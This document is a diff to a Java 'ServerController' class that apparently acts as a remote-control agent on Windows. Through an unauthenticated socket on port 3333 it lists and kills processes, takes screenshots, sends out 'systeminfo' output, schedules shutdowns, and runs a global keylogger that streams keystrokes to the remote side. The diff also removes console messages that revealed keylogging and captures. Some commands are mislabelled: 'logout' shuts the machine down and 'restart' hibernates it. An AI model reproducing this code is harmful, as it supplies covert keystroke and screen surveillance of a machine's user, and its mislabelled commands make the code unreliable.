@@ -18,20 +18,33 @@ public class ServerController {
     private BufferedWriter bw;
     private OutputStream outputStream;
 
+    private int connected = 0;
+
+    private BufferedReader br;
+    private ServerSocket ss;
+    private Socket s;
+
     public class MyThread extends Thread {
         public void run() {
             try {
-                ServerSocket ss = new ServerSocket(3333);
-                Socket s = ss.accept();
+                ss = new ServerSocket(3333);
+                s = ss.accept();
+                connected = 1;
                 outputStream = s.getOutputStream();
-                BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
+                br = new BufferedReader(new InputStreamReader(s.getInputStream()));
                 bw = new BufferedWriter(new OutputStreamWriter(s.getOutputStream()));
                 int mode = Integer.parseInt(br.readLine());
-                while (mode != -1) {
+                while (mode != 10) {
                     switch (mode) {
                         case 1 -> getRunningProcesses();
-                        case 2 -> shutdown();
-                        case 3 -> logout();
+                        case 2 -> {
+                            String timer = br.readLine();
+                            shutdown(timer);
+                        }
+                        case 3 -> {
+                            String timer = br.readLine();
+                            logout(timer);
+                        }
                         case 4 -> getImage();
                         case 5 -> {
                             String zs = br.readLine();
@@ -44,21 +57,32 @@ public class ServerController {
                         }
                         case 8 -> startKeylogger();
                         case 9 -> stopKeylogger();
+                        case 11 -> {
+                            String timer = br.readLine();
+                            restart(timer);
+                        }
+                        case 12 -> getSpecs();
                     }
                     mode = Integer.parseInt(br.readLine());
                 }
-                br.close();
-                s.close();
-                ss.close();
+                closeServer();
             } catch (IOException | AWTException | NativeHookException e) {
                 throw new RuntimeException(e);
             }
         }
     }
 
-    private final MyThread myThread = new MyThread();
+    public void closeServer() throws IOException {
+        s.close();
+        ss.close();
+        myThread.interrupt();
+    }
+    public MyThread myThread = new MyThread();
     public void openPort() {
-        myThread.start();
+        if (connected == 0) {
+            myThread.setDaemon(true);
+            myThread.start();
+        }
     }
 
     private NativeKeyListener nativeKeyListener = new NativeKeyListener() {
@@ -71,7 +95,6 @@ public class ServerController {
         public void nativeKeyReleased(NativeKeyEvent nativeEvent)
         {
             String keyText=NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
-            System.out.println("User typed: "+keyText);
             try {
                 bw.write(keyText);
                 bw.newLine();
@@ -129,10 +152,10 @@ public class ServerController {
         bw.flush();
     }
 
-    public void shutdown() {
+    public void shutdown(String timer) {
         ProcessBuilder processBuilder = new ProcessBuilder();
         try {
-            processBuilder.command("cmd", "/c" ,"shutdown -s");
+            processBuilder.command("cmd", "/c" ,"shutdown", "/s", "/t", timer);
             Process process = processBuilder.start();
             process.waitFor();
         }
@@ -142,9 +165,36 @@ public class ServerController {
         }
     }
 
-    public void logout() throws IOException {
+    public void logout(String timer) throws IOException {
         ProcessBuilder processBuilder = new ProcessBuilder();
-        processBuilder.command("cmd", "/c", "shutdown -l");
+        processBuilder.command("cmd", "/c", "shutdown", "/s", "/t", timer);
+        processBuilder.start();
+    }
+
+    public void getSpecs() throws IOException {
+        ProcessBuilder builder = new ProcessBuilder("systeminfo");
+        builder.redirectErrorStream(true);
+        Process p = builder.start();
+        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String line;
+        while (true) {
+            line = r.readLine();
+            if (line == null) {
+                break;
+            }
+            bw.write(line);
+            bw.newLine();
+            bw.flush();
+        }
+        String zz = "stop";
+        bw.write(zz);
+        bw.newLine();
+        bw.flush();
+    }
+
+    public void restart(String timer) throws IOException {
+        ProcessBuilder processBuilder = new ProcessBuilder();
+        processBuilder.command("cmd", "/c", "shutdown", "/h", "/t", timer);
         processBuilder.start();
     }
 
@@ -159,11 +209,9 @@ public class ServerController {
         outputStream.write(size);
         outputStream.write(byteArrayOutputStream.toByteArray());
         outputStream.flush();
-        System.out.println("Captured");
     }
 
     public void kill(String id) throws IOException {
-        System.out.println(id);
         ProcessBuilder processBuilder = new ProcessBuilder();
         processBuilder.command("taskkill", "/F", "/PID", id);
         processBuilder.start();
@@ -176,14 +224,12 @@ public class ServerController {
         processBuilder.start();
     }
     public void startKeylogger() throws NativeHookException {
-        System.out.println("yespapi");
         if (!GlobalScreen.isNativeHookRegistered())
             GlobalScreen.registerNativeHook();
         GlobalScreen.addNativeKeyListener(nativeKeyListener);
     }
     public void stopKeylogger() throws NativeHookException
     {
-        System.out.println("nopapi");
         GlobalScreen.removeNativeKeyListener(nativeKeyListener);
     }
 }
